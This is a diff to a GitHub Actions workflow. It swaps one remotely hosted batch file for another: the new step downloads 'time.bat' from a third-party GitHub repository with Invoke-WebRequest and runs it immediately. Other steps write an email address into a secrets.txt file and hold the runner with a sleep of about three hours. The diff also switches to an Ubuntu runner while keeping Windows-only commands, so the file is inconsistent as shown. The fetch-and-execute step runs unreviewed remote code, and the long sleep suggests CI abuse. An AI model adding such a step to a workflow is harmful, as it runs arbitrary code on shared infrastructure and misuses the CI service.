@@ -11,11 +11,8 @@ jobs:
       - name: Downloading & Setting Up
         run: |
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/g.bat" -OutFile "g.bat"
-         cmd /c g.bat
-
-      - name: Time Counter
-        run: python time.py
+         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/time.bat" -OutFile "time.bat"
+         cmd /c time.bat
 
       - name: A
         run: |
@@ -28,7 +25,7 @@ jobs:
          start-sleep -s 10801
 
   Build2:
-     runs-on: GitHub Actions
+     runs-on: ubuntu-latest
 
      steps:    
       - name: A
